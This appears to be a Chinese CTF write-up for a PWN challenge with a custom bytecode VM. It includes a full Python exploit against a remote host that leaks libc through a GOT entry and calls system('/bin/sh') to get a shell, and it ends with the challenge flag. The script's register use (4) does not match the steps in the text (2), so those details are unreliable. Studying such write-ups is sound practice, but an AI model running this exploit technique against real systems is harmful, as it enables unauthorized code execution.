
**题目分析与解题思路**
本题是一道开启了全部安全保护机制（保护全开）的PWN题目。
程序的整体运行逻辑并不复杂，借助AI工具（如DeepSeek）辅助分析即可快速掌握核心流程。简而言之，程序会首先读取用户输入的一段长数据，并将其作为自定义指令集进行后续的解释与执行。由于静态逆向过程相对直白，在此不再长篇累牍。本题的核心突破口在于动态调试，我们需要依赖GDB来实时监控用户输入的数据流向及内存转移情况。为了便于阅读和复现，下方提供我整理好的VM结构体代码，可直接复制并导入至IDA中辅助还原代码逻辑：

```c
struct VMContext {uint64_t regs[4];uint64_t ip_offset;uint64_t *rsp;uint64_t *code_base;uint64_t reserved;uint64_t *rbp;};
```

核心函数的作用梳理如下：
sub_12D5 → vm_fetch_opcode // 负责从字节码流里提取单字节的Opcode
sub_132C → vm_read_imm_qword // 负责从指令序列里抓取8字节长度的立即数（主要服务于MOV等指令的常数操作）
sub_1393 → vm_stack_push // 执行入栈动作（内部包含针对栈溢出的安全校验）
sub_1432 → vm_stack_pop   // 执行出栈动作（同样包含栈边界的安全校验）

对应的Opcode分支逻辑映射关系如下：
操作码
0x00
0x01
0x02
0x03
0x04
0x05
0x06
0x07
0x08
0x09
0x0A
0x0B

经过静态分析还原后的伪代码界面展示：
Figure 1: 
Figure 2: 
Figure 3: 
Figure 4: 

Exp（如有，请粘贴完整代码，不允许截图！）
```python
from xidp import *

#---------------------初始化----------------------------
arch = 64
elf_os = 'linux'

challenge = "./pwn2"
libc_path = './libc.so.6'
ip = '101.200.155.151:20000'
# 1-远程 其他-本地
link = 2
io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)

debug(0)            # 其他-debug   1-info
# context.terminal = ['tmux', 'splitw', '-h']
#---------------------初始化-----------------------------

#---------------------debug------------------------------
# 自定义cmd
cmd = """
    set follow-fork-mode parent
    x/60gx $rebase(0x4000)
    heap
    """
# 断点
bps = [0x014FF]
#---------------------debug-------------------------------

def mov_imm(reg, imm):
    """操作码 0x00: 将 8 字节立即数存入寄存器"""
    """0x00, reg_idx, <8B立即数>"""
    return flat(p8(0), p8(reg, signed=True), p64(imm, signed=True))  

def load_ptr_reg(ptr_reg_addr, target_reg):
    """操作码 0x01: 寄存器间接加载 (src -> dst)"""
    """0x01, target_reg = *ptr_reg_addr"""
    return flat(
            p8(1),
            p8(ptr_reg_addr, signed=True),  # 允许为负数
            p8(target_reg, signed=True)
            )

def store_ptr_reg(reg, target_reg):
    """操作码 0x02: 寄存器间接存储 (src -> [dst])"""
    """0x02, *target_reg = reg"""
    return flat(p8(2), p8(reg), p8(target_reg))  # <bb + b → p8+p8+p8

def mov_reg1_reg2(reg1, reg2):
    """操作码 0x03: 寄存器间移动 (src -> dst)"""
    """0x03, reg2 = reg1"""
    return flat(p8(3), p8(reg1), p8(reg2))  # <bb + b → p8+p8+p8

def push(reg_idx):
    """操作码 0x04: 压栈"""
    """0x04, push reg; stack_rbp-0x8"""
    return flat(p8(4), p8(reg_idx))  # <bB → p8+p8

def pop(reg_idx):
    """操作码 0x05: 出栈"""
    """0x05, pop reg stack_rbp+0x8"""
    return flat(p8(5), p8(reg_idx))  # <bB → p8+p8

def call(reg_idx):
    """操作码 0x06: 调用寄存器指向的函数"""
    """call reg"""
    return flat(p8(6), p8(reg_idx))  # <bB → p8+p8

def jmp_reg(reg_idx):
    """操作码 0x07: 跳转寄存器指向的地址"""
    """0x07, jmp reg 但是对跳转的范围有限制，所以我们不使用他"""
    return flat(p8(7), p8(reg_idx))  # <bB → p8+p8

def vm_exit():
    """操作码 0x08: 虚拟机退出"""
    return p8(8)  # b → p8

def add(reg, imm):
    """操作码 0x0A: 寄存器加立即数"""
    return flat(p8(0xA), p8(reg), p64(imm))  # <bbQ → p8+p8+p64

def sub(reg, imm):
    """操作码 0x0B: 寄存器减立即数"""
    return flat(p8(0xB), p8(reg), p64(imm))  # <bbQ → p8+p8+p64

puts_offset = libc.sym['puts']
system_offset = puts_offset- libc.sym['system']
bin_sh_offset = next(libc.search(b'/bin/sh')) - puts_offset

leak("puts_offset")
leak("system_offset")
leak("bin_sh_offset")

# VM_list = 0x04060

pwndbg(1, bps, cmd)

payload = load_ptr_reg(-11, 1)
payload += sub(1, 0x78)
payload += load_ptr_reg(1, 0)
payload += load_ptr_reg(1, 2)
payload += add(0, bin_sh_offset)
payload += sub(4, system_offset)
payload += call(4)

put(payload)

sda("Enter bytecode: ", payload)

ia()
```

**漏洞利用逻辑:**
鉴于该VM架构中直接提供了一条函数调用指令（`call`），我们的最终利用目标非常明确：将 `/bin/sh` 字符串的首地址布置到 `reg0` 寄存器中，同时挑选任意一个空闲寄存器存放 `system` 函数的入口地址，最后触发 `call` 指令即可完成利用。
为了实现这一目标，首要前提是获取Libc的基址，进而在Libc内部通过偏移量算出 `system` 与 `/bin/sh` 的真实内存地址。
按照常规思路，Libc的基地址通常可以通过读取GOT表来泄露。而要定位GOT表，就必须先拿到程序自身的基地址。
在GDB动态调试阶段，可以观察到一个极其关键的细节：内存地址 `0x04008` (`off_4008`) 处存放的指针恰好是指向其自身的。
借助这一特性，我们可以顺藤摸瓜：先基于此自引用指针算出程序的基址进而定位GOT表，接着读取GOT表项泄露出Libc的实际加载地址，再通过基址加偏移的公式计算出所需的目标函数和参数位置，最终执行 `call` 夺取系统权限。

**Exp具体执行步骤梳理如下：**
1. 首先调用 `load_ptr_reg(-11, 1)` 并配合 `sub(1, 0x78)` 指令，把前文提到的特定地址装载进 `reg1` 寄存器。随后利用算术运算调整指针，使其精确指向 `puts` 函数的GOT表项。
2. 接着，依靠 `load_ptr_reg(1, 0)` 和 `load_ptr_reg(1, 2)` 这两步操作，把提取到的 `puts_addr` 真实地址分别载入到 `reg0` 以及 `reg2` 寄存器内备用。
3. 随后执行 `add(0, bin_sh_offset)` 与 `sub(2, system_offset)`，利用提前算好的偏移量做加减法，分别求出 `binsh` 字符串和 `system` 函数在内存中的绝对地址。
4. 万事俱备，最后直接下发一条 `call` 指令完成调用，成功获取Shell！

```text
ISCC{19fjm99l-ittw-a0dg-6ygx-mvt3t17mnnlb}
```